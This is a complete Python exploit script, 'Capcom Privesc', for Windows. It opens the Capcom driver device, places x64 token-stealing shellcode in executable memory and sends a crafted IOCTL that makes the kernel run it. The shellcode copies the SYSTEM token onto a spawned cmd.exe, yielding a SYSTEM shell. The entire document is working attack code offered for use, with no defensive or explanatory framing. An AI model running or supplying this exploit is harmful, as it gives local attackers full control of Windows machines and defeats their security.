from ctypes import *
from ctypes.wintypes import *
import sys, struct, time

### VirtualAlloc() globals ###
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040

### gethandle() globals ###
CREATE_NEW_CONSOLE = 0x00000010
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x00000003
FILE_ATTRIBUTE_NORMAL = 0x00000080

### Windows API shorthand ###
CreateFile = windll.kernel32.CreateFileW
DeviceIoControl = windll.kernel32.DeviceIoControl
VirtualAlloc = windll.kernel32.VirtualAlloc
CreateProcess = windll.kernel32.CreateProcessW

### spawnshell() globals ###
HANDLE = c_void_p
LPTSTR = c_void_p
LPBYTE = c_char_p

class STARTUPINFO(Structure):
    _fields_ = [("cb", DWORD),
                ("lpReserved", LPTSTR),
                ("lpDesktop", LPTSTR),
                ("lpTitle", LPTSTR),
                ("dwX", DWORD),
                ("dwY", DWORD),
                ("dwXSize", DWORD),
                ("dwYSize", DWORD),
                ("dwXCountChars", DWORD),
                ("dwYCountChars", DWORD),
                ("dwFillAttribute", DWORD),
                ("dwFlags", DWORD),
                ("wShowWindow", WORD),
                ("cbReserved2", WORD),
                ("lpReserved2", LPBYTE),
                ("hStdInput", HANDLE),
                ("hStdOutput", HANDLE),
                ("hStdError", HANDLE)]

class PROCESS_INFORMATION(Structure):
    _fields_ = [("hProcess", HANDLE),
                ("hThread", HANDLE),
                ("dwProcessId", DWORD),
                ("dwThreadId", DWORD)]


class BUFFER(Structure):
    _fields_ = [("ptr", c_ulonglong)
                ]

### Spawn SYSTEM cmd ###
def spawnshell():
    print "[*]Spawning shell[*]"
    lpApplicationName = u"c:\\windows\\system32\\cmd.exe" # Unicode
    lpCommandLine = u"c:\\windows\\system32\\cmd.exe" # Unicode
    lpProcessAttributes = None
    lpThreadAttributes = None
    bInheritHandles = 0
    dwCreationFlags = CREATE_NEW_CONSOLE
    lpEnvironment = None
    lpCurrentDirectory = None
    lpStartupInfo = STARTUPINFO()
    lpStartupInfo.cb = sizeof(lpStartupInfo)
    lpProcessInformation = PROCESS_INFORMATION()

    ret = CreateProcess(lpApplicationName,           # _In_opt_      LPCTSTR
                        lpCommandLine,               # _Inout_opt_   LPTSTR
                        lpProcessAttributes,         # _In_opt_      LPSECURITY_ATTRIBUTES
                        lpThreadAttributes,          # _In_opt_      LPSECURITY_ATTRIBUTES
                        bInheritHandles,             # _In_          BOOL
                        dwCreationFlags,             # _In_          DWORD
                        lpEnvironment,               # _In_opt_      LPVOID
                        lpCurrentDirectory,          # _In_opt_      LPCTSTR
                        byref(lpStartupInfo),        # _In_          LPSTARTUPINFO
                        byref(lpProcessInformation)) # _Out_         LPPROCESS_INFORMATION
    if not ret:
        print "\t[-]Error spawning shell: " + FormatError()
        sys.exit(-1)

    time.sleep(2) # Make sure cmd.exe spawns fully before shellcode executes

    print "\t[+]Spawned with PID: %d" % lpProcessInformation.dwProcessId
    pid = lpProcessInformation.dwProcessId
    return pid

### Stealing SYSTEM token ###
def shellcode(pid):
    tokenstealing = (
        "\xCC"
        "\x65\x4C\x8B\x0C\x25\x88\x01\x00\x00"      # mov r9, [gs:188h]    ;KTHREAD pointer
        "\x4D\x8B\x89\x20\x02\x00\x00"              # mov r9, [r9+220h]    ;EPROCESS pointer
        "\x4D\x8B\x89\xf0\x02\x00\x00"              # mov r9, [r9+2f0h]    ;ActiveProcessLinks list head
        "\x49\x8B\x01"                              # mov rax, [r9]        ;follow link to first process in list
        "\x48\x8B\x50\xF8"                          # mov rdx, [rax-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
        "\x48\x83\xFA\x04"                          # cmp rdx, 4           ;UniqueProcessId == 4?
        "\x74\x05"                                  # jz found_system      ;YES - move on
        "\x48\x8B\x00"                              # mov rax, [rax]       ;NO - load next entry in list
        "\xEB\xF1"                                  # jmp find_system      ;loop
        "\x48\x8B\x48\x68"                          # mov rcx, [rax+0x68]  ;offset to token
        "\x80\xE1\xF0"                              # and cl, 0f0h         ;clear low 4 bits of _EX_FAST_REF structure
        "\x48\x8B\x50\xF8"                          # mov rdx, [rax-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
        "\x48\x81\xFA" + struct.pack("<I", pid) +   # cmp rdx, ZZZZ        ;UniqueProcessId == ZZZZ? (PLACEHOLDER)
        "\x74\x05"                                  # jz found_cmd         ;YES - move on
        "\x48\x8B\x00"                              # mov rax, [rax]       ;NO - next entry in list
        "\xEB\xEE"                                  # jmp find_cmd         ;loop
        "\x48\x89\x48\x68"                          # mov [rax+0x68], rcx ;copy SYSTEM token over top process's token
        "\xC3")                                     # ret

    lpAddress = None
    dwSize = len(tokenstealing)+8
    flAllocationType = (MEM_COMMIT | MEM_RESERVE)
    flProtect = PAGE_EXECUTE_READWRITE

    BufferBase = VirtualAlloc(lpAddress,
                                 dwSize,
                                 flAllocationType,
                                 flProtect)

    if not BufferBase:
        print "\t[-]Error allocating buffer: " + FormatError()
        sys.exit(-1)
    print "[*]Return address for VirtualAlloc 0x%x" % BufferBase
    mystruct = cast(BufferBase, POINTER(BUFFER))
    mystruct.contents.ptr = BufferBase + 8
    memmove(BufferBase+8,tokenstealing,len(tokenstealing))
    print "\t[+]Successfully loaded shellcode"
    return BufferBase

### Get handle for driver and return ###
def gethandle():
    print "[*]Getting device handle[*]"
    lpFileName = u"\\\\.\\Htsysm72FB"
    dwDesiredAccess = (GENERIC_READ | GENERIC_WRITE)
    dwShareMode = 0
    lpSecurityAttributes = None
    dwCreationDisposition = OPEN_EXISTING
    dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
    hTemplateFile = None

    handle = CreateFile(lpFileName,
                         dwDesiredAccess,
                         dwShareMode,
                         lpSecurityAttributes,
                         dwCreationDisposition,
                         dwFlagsAndAttributes,
                         hTemplateFile)

    if not handle or handle == -1:
            print"\t[-]Error getting device handle: " + FormatError()
            sys.exit(-1)

    print "\t[+]Got device handle: 0x%x" % handle
    return handle

### Send IOCTL to interact with driver ###
def send_ioctl(hDevice, BufferBase):
    target = BufferBase
    OutBuffer = create_string_buffer("ZZZZ")    #Create 4 byte buffer for the OutBuffer parameter
    print "[*]Sending malicious IOCTL..."
    dwIoControlCode = 0xAA013044
    lpInBuffer = target
    nInBufferSize = 8   # Hardcoded for checking within IOCTL Dispatch Handler
    lpOutBuffer = addressof(OutBuffer)
    nOutBufferSize = 4
    lpBytesReturned = byref(c_ulong())
    lpOverlapped = None

    pwnd = DeviceIoControl(hDevice,             # _In_        HANDLE
                           dwIoControlCode,     # _In_        DWORD
                           lpInBuffer,          # _In_opt_    LPVOID
                           nInBufferSize,       # _In_        DWORD
                           lpOutBuffer,         # _Out_opt_   LPVOID
                           nOutBufferSize,      # _In_        DWORD
                           lpBytesReturned,     # _Out_opt_   LPDWORD
                           lpOverlapped)        # _Inout_opt_ LPOVERLAPPED

    if not pwnd:
        print "\t[-]Error sending IOCTL: " + FormatError()
        sys.exit(-1)
    print "\t[+]Enjoy SYSTEM shellz"

if __name__ == "__main__":
    print "\nCapcom Privesc\n"
    pid = spawnshell()
    send_ioctl(gethandle(), shellcode(pid))
